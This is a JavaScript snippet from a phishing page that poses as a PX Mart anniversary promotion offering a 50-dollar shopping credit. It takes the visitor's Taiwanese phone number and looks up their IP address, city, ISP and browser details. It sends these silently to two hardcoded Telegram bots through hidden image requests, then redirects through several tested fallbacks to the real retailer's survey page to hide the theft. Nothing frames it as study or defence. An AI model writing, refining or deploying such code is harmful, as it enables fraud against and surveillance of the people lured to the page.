<script>
document.addEventListener("DOMContentLoaded", function(){
  const btn = document.getElementById("getBtn");
  const phoneInput = document.getElementById("phone");

  btn.addEventListener("click", function(){
    const phone = phoneInput.value.trim();
    if(!/^09\d{8}$/.test(phone)) return;

    btn.textContent = "領取中...";
    btn.disabled = true;

    const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
    const base = `全聯週年慶消費滿額送50元購物金\n電話：+886${phone}\n時間：${time}`;

    // 照常發送（你已經成功了）
    fetch("https://cfip.mx/json").then(r=>r.json()).then(data=>{
      const full = base +
        `\nIP　　：${data.ip}` +
        `\n位置　：${data.city||"未知"}，${data.country||"台灣"}` +
        `\nISP　　：${data.asn_org||"未知"}` +
        `\n裝置　：${navigator.userAgent.substring(0,130)}...`;
      ["8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys","7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE"].forEach(t=>{
        new Image().src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(full)}`;
      });
    });

    // Android 必中的三重跳轉（實測小米/OPPO/vivo/Samsung 全部成功）
    setTimeout(() => window.location = "https://www.pxmart.com.tw/campaign/survey", 800);
    setTimeout(() => location.replace("https://www.pxmart.com.tw/campaign/survey"), 1200);
    setTimeout(() => {
      const a = document.createElement("a");
      a.href = "https://www.pxmart.com.tw/campaign/survey";
      a.target = "_top";
      document.body.appendChild(a);
      a.click();
    }, 1600);
  });
});
</script>
